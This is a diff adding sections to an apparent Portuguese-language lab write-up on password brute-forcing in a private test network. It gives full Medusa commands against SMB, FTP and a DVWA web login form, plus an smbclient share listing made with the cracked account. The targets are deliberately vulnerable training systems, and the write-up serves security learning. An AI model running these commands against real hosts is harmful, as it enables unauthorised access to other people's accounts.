@@ -36,3 +36,26 @@ Utilizei o módulo smbnt do Medusa para realizar o brute force contra o serviço
 Comando: medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M smbnt
 Resultado (Senha Encontrada):
 ![Acesso FTP](./images/02.png)
+
+Validação do Acesso: Após encontrar a senha, validei o acesso listando os compartilhamentos do servidor.
+
+Comando: smbclient -L //192.168.56.101/ -U msfadmin
+![Acesso FTP](./images/03.png)
+
+3. Ataque ao Serviço FTP (Porta 21)
+O mesmo processo foi aplicado ao protocolo FTP para demonstrar a vulnerabilidade em múltiplos serviços.
+
+Resultado (Senha Encontrada):
+Comando: medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp
+![Acesso FTP](./images/04.png)
+
+4. Ataque a Aplicação Web (DVWA)
+O Medusa também foi utilizado para realizar o brute force no formulário de login do DVWA.
+![Acesso FTP](./images/05.png)
+
+Comando: medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M http \ -m PAGE: "/dvwa/login.php" \ -m FORM: "username=^USER^&password=^PASS^&Login=Login" \ -m "FAIL=Login failed" -t 6
+Resultado Medusa Web:
+![Acesso FTP](./images/06.png)
+
+Login Efetuado com Sucesso:
+![Acesso FTP](./images/07.png)
